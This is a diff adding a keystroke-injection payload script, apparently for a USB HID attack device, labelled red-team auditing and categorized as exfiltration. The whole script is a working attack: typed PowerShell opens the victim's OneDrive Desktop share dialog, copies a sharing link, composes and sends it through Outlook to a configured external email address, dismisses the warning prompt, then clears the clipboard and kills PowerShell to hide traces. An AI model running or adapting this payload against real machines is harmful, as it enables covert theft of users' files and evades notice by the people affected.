@@ -1,0 +1,148 @@
+#!/bin/bash
+#
+# Title:         Window-Shopping
+# Description:   RedTeam Auditing - Copy OneDrive Desktop sharing link,
+#                send via Outlook.
+# Author:        Hackazillarex
+# Version:       1.0
+# Category:      Exfil
+# Target:        Windows (M365/OneDrive environments)
+# Tested On:     Windows 11
+# Attackmodes:   HID
+# Note:          Pure HID - no STORAGE, no companion PS1, no Outlook COM.
+#                PowerShell opens OneDrive share & copies link to clipboard.
+#                HID composes & sends the email directly in Outlook.
+#                Works with new Outlook and classic Outlook.
+#                No Defender bypass needed - uses only native shell features.
+
+# ========== CONFIGURATION ==========
+EXFIL_EMAIL="youremail@email.com"
+EMAIL_SUBJECT="Project Files"
+EMAIL_BODY="Link attached."
+
+######## SETUP ########
+LED SETUP
+ATTACKMODE HID
+
+######## STAGE 1 - Open PowerShell (normal user) ########
+LED STAGE1
+QUACK GUI r
+QUACK DELAY 500
+QUACK STRING powershell
+QUACK ENTER
+QUACK DELAY 2000
+
+######## STAGE 2 - Find OneDrive Desktop & open share dialog ########
+LED STAGE2
+QUACK STRING Add-Type -AssemblyName System.Windows.Forms
+QUACK ENTER
+QUACK DELAY 500
+QUACK STRING "\$odPath = \$env:OneDriveCommercial; if (-not \$odPath) { \$odPath = \$env:OneDrive }"
+QUACK ENTER
+QUACK STRING "\$deskPath = Join-Path \$odPath 'Desktop'"
+QUACK ENTER
+QUACK STRING "\$sh = New-Object -ComObject Shell.Application"
+QUACK ENTER
+QUACK STRING "\$pf = \$sh.NameSpace((Split-Path \$deskPath))"
+QUACK ENTER
+QUACK STRING "\$fi = \$pf.ParseName((Split-Path \$deskPath -Leaf))"
+QUACK ENTER
+QUACK STRING "\$sv = \$fi.Verbs() | Where-Object { \$_.Name -match 'shar' }"
+QUACK ENTER
+QUACK STRING "if (\$sv) { \$sv.DoIt() } else { Start-Process \"odopen://share?path=\$([Uri]::EscapeDataString(\$deskPath))\" }"
+QUACK ENTER
+QUACK DELAY 5000
+
+######## STAGE 3 - Navigate share dialog & copy link (HID) ########
+LED STAGE3
+# Tab to "Copy link" button (9 tabs)
+QUACK TAB
+QUACK DELAY 150
+QUACK TAB
+QUACK DELAY 150
+QUACK TAB
+QUACK DELAY 150
+QUACK TAB
+QUACK DELAY 150
+QUACK TAB
+QUACK DELAY 150
+QUACK TAB
+QUACK DELAY 150
+QUACK TAB
+QUACK DELAY 150
+QUACK TAB
+QUACK DELAY 150
+QUACK TAB
+QUACK DELAY 1000
+# Press Enter to copy link to clipboard
+QUACK ENTER
+QUACK DELAY 2000
+# Tab + Enter to confirm the copy
+QUACK TAB
+QUACK DELAY 200
+QUACK ENTER
+QUACK DELAY 1500
+# Close the share confirmation dialog
+QUACK ALT F4
+QUACK DELAY 2000
+
+######## STAGE 4 - Minimize PowerShell, open Outlook (HID) ########
+LED STAGE4
+# Minimize PowerShell window
+QUACK GUI DOWN
+QUACK DELAY 500
+# Open Outlook via Windows search
+QUACK GUI
+QUACK DELAY 800
+QUACK STRING outlook
+QUACK DELAY 1500
+QUACK ENTER
+QUACK DELAY 3000
+
+######## STAGE 5 - Compose email & paste link (HID) ########
+LED STAGE5
+# New email
+QUACK CTRL n
+QUACK DELAY 1500
+# Type the To address
+QUACK STRING $EXFIL_EMAIL
+QUACK DELAY 500
+# Tab past CC to Subject
+QUACK TAB
+QUACK DELAY 200
+QUACK TAB
+QUACK DELAY 200
+# Type the subject
+QUACK STRING $EMAIL_SUBJECT
+QUACK DELAY 500
+# Tab to body
+QUACK TAB
+QUACK DELAY 500
+# Type body text
+QUACK STRING $EMAIL_BODY
+QUACK ENTER
+QUACK ENTER
+# Paste the OneDrive link from clipboard
+QUACK CTRL v
+QUACK DELAY 1000
+
+######## STAGE 6 - Send the email (HID) ########
+LED STAGE6
+# Ctrl+Enter sends in both new and classic Outlook
+QUACK CTRL ENTER
+QUACK DELAY 2000
+# Dismiss "forgot attachment?" prompt
+QUACK ENTER
+QUACK DELAY 2000
+
+######## STAGE 7 - Cleanup (clear clipboard & close PowerShell) ########
+LED CLEANUP
+# Clear clipboard and kill leftover PowerShell in one shot
+QUACK GUI r
+QUACK DELAY 500
+QUACK STRING powershell -WindowStyle Hidden -Command "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.Clipboard]::Clear(); Stop-Process -Name powershell -ErrorAction SilentlyContinue"
+QUACK ENTER
+QUACK DELAY 1000
+
+######## DONE ########
+LED FINISH
